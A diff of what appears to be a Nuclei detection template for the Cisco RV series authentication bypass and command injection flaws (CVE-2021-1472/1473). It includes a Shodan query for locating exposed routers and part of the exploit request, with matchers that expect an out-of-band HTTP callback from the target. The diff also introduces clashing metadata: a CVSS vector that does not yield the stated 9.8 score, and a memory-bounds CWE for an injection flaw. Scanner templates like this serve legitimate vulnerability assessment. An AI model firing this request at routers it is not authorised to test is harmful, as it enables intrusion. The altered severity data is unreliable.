@@ -1,5 +1,4 @@
 id: cisco-rv-series-rce
-
 info:
   name: Cisco Small Business RV Series - Authentication Bypass and Command Injection
   author: gy741
@@ -13,15 +12,14 @@ info:
     - https://nvd.nist.gov/vuln/detail/CVE-2021-1472
     - https://nvd.nist.gov/vuln/detail/CVE-2021-1473
   classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
     cvss-score: 9.8
-    cve-id: CVE-2021-1472
-    cwe-id: CWE-287
+    cve-id: CVE-2021-1472,CVE-2021-1473
+    cwe-id: CWE-119
   metadata:
+    verified: true
     shodan-query: http.html:"Cisco rv340"
-    verified: "true"
-  tags: auth-bypass,injection,packetstorm,cve,cve2021,cisco,rce,intrusive
-
+  tags: cve,cve2021,cisco,rce,auth-bypass,injection
 requests:
   - raw:
       - |
@@ -57,14 +55,12 @@ requests:
 
         <input><fileType>configuration</fileType><source><location-url>FILE://Configuration/config.xml</location-url></source><destination><config-type>config-running</config-type></destination></input>
         -----------------------------392306610282184777655655237536--
-
     matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol
         words:
           - http
-
       - type: word
         part: body
         words:
